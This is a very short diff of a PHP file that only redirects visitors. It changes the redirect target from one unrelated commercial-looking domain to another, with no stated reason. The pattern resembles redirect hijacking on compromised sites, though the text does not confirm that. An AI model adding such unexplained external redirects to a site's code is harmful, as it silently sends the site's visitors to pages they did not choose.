@@ -1,5 +1,5 @@
 <?php
-header("Location: https://insuranceperfectrade.com");
+header("Location: https://poassetbenefit.online");
 exit();
 ?>
 
